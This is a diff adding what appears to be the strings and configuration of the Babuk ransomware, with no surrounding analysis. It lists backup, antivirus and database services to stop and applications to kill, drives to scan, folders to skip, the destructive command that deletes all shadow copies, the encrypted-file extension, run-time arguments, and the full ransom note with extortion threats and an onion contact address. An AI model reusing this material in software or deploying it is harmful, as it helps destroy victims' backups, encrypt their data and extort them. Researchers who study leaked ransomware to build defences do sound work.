@@ -1,0 +1,190 @@
+
+// services to stop
+vss
+sql
+svc$
+memtas
+mepocs
+sophos
+veeam
+backup
+GxVss
+GxBlr
+GxFWD
+GxCVD
+GxCIMgr
+DefWatch
+ccEvtMgr
+ccSetMgr
+SavRoam
+RTVscan
+QBFCService
+QBIDPService
+Intuit.QuickBooks.FCS
+QBCFMonitorService
+YooBackup
+YooIT
+zhudongfangyu
+sophos
+stc_raw_agent
+VSNAPVSS
+VeeamTransportSvc
+VeeamDeploymentService
+VeeamNFSSvc
+veeam
+PDVFSService
+BackupExecVSSProvider
+BackupExecAgentAccelerator
+BackupExecAgentBrowser
+BackupExecDiveciMediaService
+BackupExecJobEngine
+BackupExecManagementService
+BackupExecRPCService
+AcrSch2Svc
+AcronisAgent
+CASAD2DWebSvc
+CAARCUpdateSvc
+
+//process to kill
+
+sql.exe
+oracle.exe
+ocssd.exe
+dbsnmp.exe
+synctime.exe
+agntsvc.exe
+isqlplussvc.exe
+xfssvccon.exe
+mydesktopservice.exe
+ocautoupds.exe
+encsvc.exe
+firefox.exe
+tbirdconfig.exe
+mydesktopqos.exe
+ocomm.exe
+dbeng50.exe
+sqbcoreservice.exe
+excel.exe
+infopath.exe
+msaccess.exe
+mspub.exe
+onenote.exe
+outlook.exe
+powerpnt.exe
+steam.exe
+thebat.exe
+thunderbird.exe
+visio.exe
+winword.exe
+wordpad.exe
+notepad.exe
+
+//Check roots
+
+Q:\
+W:\
+E:\
+R:\
+T:\
+Y:\
+U:\
+I:\
+O:\
+P:\
+A:\
+S:\
+D:\
+F:\
+G:\
+H:\
+J:\
+K:\
+L:\
+Z:\
+X:\
+C:\
+V:\
+B:\
+N:\
+M:\
+
+
+IsWow64Process
+kernel32.dll
+kernel32.dll
+Wow64DisableWow64FsRedirection
+/c vssadmin.exe delete shadows /all /quiet
+cmd.exe
+open
+kernel32.dll
+Wow64RevertWow64FsRedirection
+advapi32.dll
+SystemFunction036
+
+//Excluded + Search folders
+Tor Browser
+Internet Explorer
+Google
+Opera
+Opera Software
+Mozilla
+Mozilla Firefox
+ecdh_pub_k.bin
+
+Windows
+Windows.old
+$Recycle.Bin
+ProgramData
+All Users
+autorun.inf
+boot.ini
+bootfont.bin
+bootsect.bak
+bootmgr
+bootmgr.efi
+bootmgfw.efi
+desktop.ini
+iconcache.db
+ntldr
+ntuser.dat
+ntuser.dat.log
+ntuser.ini
+thumbs.db
+Program Files
+Program Files (x86)
+
+/ransom note
+
+----------- [ Hello! ] ------------->
+       ****BY BABUK LOCKER****
+What happend?
+----------------------------------------------
+Your computers and servers are encrypted, backups are deleted from your network and copied. We use strong encryption algorithms, so you cannot decrypt your data.
+But you can restore everything by purchasing a special program from us - a universal decoder. This program will restore your entire network.
+Follow our instructions below and you will recover all your data.
+If you continue to ignore this for a long time, we will start reporting the hack to mainstream media and posting your data to the dark web.
+What guarantees?
+----------------------------------------------
+We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests.
+All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems.
+We guarantee to decrypt one file for free. Go to the site and contact us.
+How to contact us? 
+----------------------------------------------
+Using TOR Browser ( https://www.torproject.org/download/ ):
+http://babukq4e2p4wu4iq.onion/login.php?id=8M60J4vCbbkKgM6QnA07E9qpkn0Qk7
+!!! DANGER !!!
+DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them. 
+!!! DANGER !!
+.__NIST_K571__
+How To Restore Your Files.txt
+.__NIST_K571__
+\How To Restore Your Files.txt
+
+//arguments
+-lanfirst
+-lansecond
+-nolan
+APPDATA
+\ecdh_pub_k.bin
+
+
